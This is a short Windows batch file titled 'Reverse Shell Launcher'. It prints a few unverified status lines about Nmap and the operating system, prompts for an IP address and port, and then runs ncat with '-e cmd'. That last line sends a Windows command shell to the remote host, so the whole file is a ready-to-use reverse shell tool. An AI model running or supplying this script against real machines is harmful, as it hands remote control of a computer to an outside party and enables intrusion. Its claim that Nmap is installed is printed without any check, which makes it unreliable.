@echo off
title Reverse Shell Launcher

REM Display Nmap installation status and OS information
echo - Nmap is installed.
echo.

REM Check if Nmap directory exists
if exist "C:\Nmap" (
    echo - Nmap directory exists.
) else (
    echo - Nmap directory does not exist.
)
echo.

REM Display OS information
echo - Operating System: %OS%
echo.
echo -------------------------------------

REM Prompt the user to enter the IP address
set /p IP_ADDRESS="Enter the IP address: "

REM Prompt the user to enter the port
set /p PORT="Enter the port: "
echo.

REM Validate input
if "%IP_ADDRESS%" == "" (
    echo - Error: IP address cannot be empty.
    pause
    exit /b
)

if "%PORT%" == "" (
    echo - Error: Port cannot be empty.
    pause
    exit /b
)

REM Execute the nmap command
ncat %IP_ADDRESS% %PORT% -e cmd

